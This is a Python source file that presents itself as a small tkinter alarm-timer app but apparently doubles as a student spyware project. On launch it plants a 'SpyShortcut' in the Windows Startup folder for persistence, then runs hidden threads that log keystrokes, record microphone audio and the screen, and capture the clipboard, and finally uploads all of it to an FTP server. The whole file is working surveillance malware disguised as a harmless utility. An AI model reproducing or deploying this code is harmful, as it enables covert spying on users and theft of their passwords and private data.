
from __future__ import print_function
from __future__ import division
import sys
import time
import os
from pynput.keyboard import Key, Listener
from ftplib import FTP
import pyaudio
import wave
import cv2
import numpy as np
import pyautogui
import time
import pyperclip
import threading
import winreg as reg
import os
import win32com.client
try:
    import tkinter
except ImportError:
    import Tkinter as tkinter

# add flush parameter to print if python2
if sys.version_info[:2] < (3, 3):
    old_print = print
    def print(*args, **kwargs):
        flush = kwargs.pop('flush', False)
        old_print(*args, **kwargs)
        if flush:
            file = kwargs.get('file', sys.stdout)
            # Why might file=None? IDK, but it works for print(i, file=None)
            file.flush() if file is not None else sys.stdout.flush()


# absolute script directory path
abs_dir = os.path.dirname(os.path.abspath(__file__))

startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

script_path = os.path.abspath(__file__)

shortcut_path = os.path.join(startup_folder, 'SpyShortcut.lnk')
shell = win32com.client.Dispatch('WScript.Shell')
shortcut = shell.CreateShortCut(shortcut_path)
shortcut.TargetPath = script_path #"C:/Users/mcsco/Desktop/Senior_Project/project-repository-MarcusScott483/spy.py" #maybe needs to be script_path, add .exe instead of .py ?
shortcut.WorkingDirectory = os.path.dirname(script_path)
shortcut.Save()

logfile = open("keylog.txt", "w")


class AlarmWin(object):

    def __init__(self):
        self._root = tkinter.Tk()
        self._root.iconbitmap(os.path.join(abs_dir, "data", "alarm.ico"))
        self._default_bg = self._root.cget('bg')
        self._afters = set()
        self._fill_window()
        self._going_off = False

    def _fill_window(self):
        self._root.title('Alarm')
        row = tkinter.Frame(self._root)
        tkinter.Label(row, text="mins:").pack(side="left")
        self._user_mins = tkinter.Text(row, height=1, width=5)
        self._user_mins.pack(side="left")
        self._user_mins.insert(tkinter.END, "10")
        row.pack()
        row = tkinter.Frame(self._root)
        tkinter.Label(row, text="last start:").pack(side="left")
        self._started = tkinter.Label(row, text="?")
        self._started.pack(side="left")
        row.pack()
        self._state = tkinter.Label(self._root, text="idle")
        self._state.pack()
        row = tkinter.Frame(self._root)
        self._minimize_chk_var = tkinter.IntVar()
        self._minimize_chk_var.set(1)
        tkinter.Button(row, text="start", command=self._start_cb).pack(side="left")
        tkinter.Button(row, text="ack", command=self.ack).pack(side="left")
        tkinter.Checkbutton(row, text="auto min", variable=self._minimize_chk_var).pack(side="left")
        row.pack()

    def _start_cb(self):
        """Start button callback, reads minutes and starts alarm
        
        """
        user_input = self._user_mins.get("1.0", tkinter.END)
        try:
            user_input = float(user_input)
            self.start_alarm(user_input)
        except ValueError as e:
            self._started.config(text=repr(e))

    def _schedule(self, ms, func, *args):
        """Schedules :param func: to be executed after :param ms: milliseconds, registering it in ._afters
        
        :param ms: milliseconds of delay
        :type ms: int
        :param func: function to be executed
        :type func: callable

        :return: scheduling identifier
        :rtype: str
        """
        def wrapper(*args):
            func(*args)
            self._afters.remove(after_id)
        after_id = self._root.after(ms, wrapper, *args)
        self._afters.add(after_id)
        return after_id

    def _unschedule(self, after_id=None):
        """Unschedules function with given id, by default unschedules all functions
        
        :param after_id: function id to be unscheduled, defaults to None (i.e. all functions)
        :param after_id: str, optional
        """
        if after_id is None:
            for id_ in self._afters:
                self._root.after_cancel(id_)
            self._afters.clear()
        else:
            self._root.after_cancel(after_id)
            self._afters.discard(id_)

    def start_alarm(self, mins):
        """Starts an alarm that will go off in :param mins: minutes, if checkbox is ticked minimizes window
        
        :param mins: minutes until the alarm goes off
        :type mins: int
        """
        self.ack()        
        # don't force window to be topmost anymore
        self._root.attributes('-topmost', False)
        # update state text
        self._state.config(text="ticking")
        # update start time
        self._started.config(text=time.strftime('%H:%M'))

        # minimize if checkbox ticked
        if self._minimize_chk_var.get() == 1:
            self.minimize()

        # schedule going off
        self._schedule(int(mins*60000), self._go_off)
        
    def _go_off(self):
        """Sets alarm off and periodically asks for attention until ack
        
        """
        self._going_off = True
        self._state.config(text="ringing")
        self._root.attributes('-topmost', True)
        self.unminimize()
        def periodically_grab_attention():
            self.unminimize()
            self._root.config(background="orange")
            for i in range(3):
                self._schedule(i*1000 + 500, lambda: self._root.config(background=self._default_bg))
                self._schedule(i*1000 + 1000, lambda: self._root.config(background="orange"))
            self._schedule(30*1000, periodically_grab_attention)
        periodically_grab_attention()

    def minimize(self):
        """Minimizes the window
        
        """
        self._root.wm_state('iconic')  # minimize cmd

    def unminimize(self):
        """Unminimizes root window, does nothing if it's not minimized
        
        """
        self._root.wm_state('normal')  # unminimize cmd

    def ack(self):
        """Stops alarm from requiring attention
        
        """
        self._unschedule()
        self._root.attributes('-topmost', False)
        self._state.config(text="idle")
        self._root.config(background=self._default_bg)
        self._going_off = False

    def _place_window(self):
        """Places window where it ought to be
        
        """
        # get window sizes
        self._root.update()
        w = self._root.winfo_width()
        h = self._root.winfo_height()
        
        w *= 1.4

        # get screen width and height
        ws = self._root.winfo_screenwidth() # width of the screen
        hs = self._root.winfo_screenheight() # height of the screen
        
        roffset = 16
        boffset = 80

        # set the dimensions of the screen
        # and where it is placed
        self._root.geometry('%dx%d+%d+%d' % (w, h, ws-w-roffset, hs-h-boffset))

    def mainloop(self):
        """Starts tkinter window loop
        
        """
        self._place_window()
        self._root.mainloop()

def pressed(key):
    try:
        print('Key {} pressed.'.format(key))
        logfile.write(str(key))
    except AttributeError:
        print('Special key {} pressed.'.format(key))

def released(key):
    print('Key {} released.'.format(key))
    if key == Key.esc:
        print("keystroke capture stopped, uploading to FTP server")
        logfile.close()
        ftp = FTP("localhost", "username", "password")
        with open("keylog.txt", "rb") as f:
            ftp.storbinary(f"STOR logfile.txt", f)

        with open("audioRecording.wav", "rb") as wav:
            ftp.storbinary("STOR audioRecording.wav", wav)

        with open("screenRecording.mp4", "rb") as vid:
            ftp.storbinary("STOR screenRecording.mp4", vid)

        with open("clipboardLog.txt", "rb") as cb:
            ftp.storbinary("STOR clipboardLog.txt", cb)

        ftp.quit()

        return False


def audioWorker(): 

    audio = pyaudio.PyAudio()
    stream = audio.open(format=pyaudio.paInt16, channels=1,
                    rate=44100, input=True,
                    frames_per_buffer=1024)
    print("recording audio")

    frames = []
    for i in range(0, int(44100 / 1024 * 5)):
        data = stream.read(1024)
        frames.append(data)

    print("audio recording stopped")

    stream.stop_stream()
    stream.close()
    audio.terminate()

    wf = wave.open("audioRecording.wav", 'wb')
    wf.setnchannels(1)
    wf.setsampwidth(audio.get_sample_size(pyaudio.paInt16))
    wf.setframerate(44100)
    wf.writeframes(b''.join(frames))
    wf.close()

def screenWorker():
    print("recording screen")
    screenSize = (1920, 1080)

    out = cv2.VideoWriter("screenRecording.mp4", cv2.VideoWriter_fourcc(*"mp4v"), 25, screenSize)

    startTime = time.monotonic()
    timeLimit = 3

    while time.monotonic() - startTime < timeLimit:
        screenshot = pyautogui.screenshot()
        frame = np.array(screenshot)

        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        out.write(frame)
    
    print("screen recording stopped")

    out.release()
    cv2.destroyAllWindows()


def clipboardWorker():

    startTime = time.monotonic()
    timeLimit = 15

    stop_flag = False

    print("capturing clipboard")
    duration = 10 
    start_time = time.time()

    previous_clipboard = ""

    stop_flag = False

    while not stop_flag:
        current_clipboard = pyperclip.paste()
        if current_clipboard != previous_clipboard:
            with open("clipboardLog.txt", "a") as f:
                f.write(current_clipboard + "\n")
            previous_clipboard = current_clipboard
        elapsed_time = time.time() - start_time
        if elapsed_time >= duration:
            stop_flag = True
        time.sleep(0.1)

    print("clipboard capture stopped")

def keyloggerWorker():
    print("capturing keystrokes")
    with Listener(on_press=pressed, on_release=released) as listener:
        listener.join()

audioThread = threading.Thread(target=audioWorker)
screenThread = threading.Thread(target=screenWorker)
clipboardThread = threading.Thread(target=clipboardWorker)
keyloggerThread = threading.Thread(target=keyloggerWorker)

audioThread.start()
screenThread.start()
clipboardThread.start()
keyloggerThread.start()

AlarmWin().mainloop()

audioThread.join()
screenThread.join()
clipboardThread.join()
keyloggerThread.join()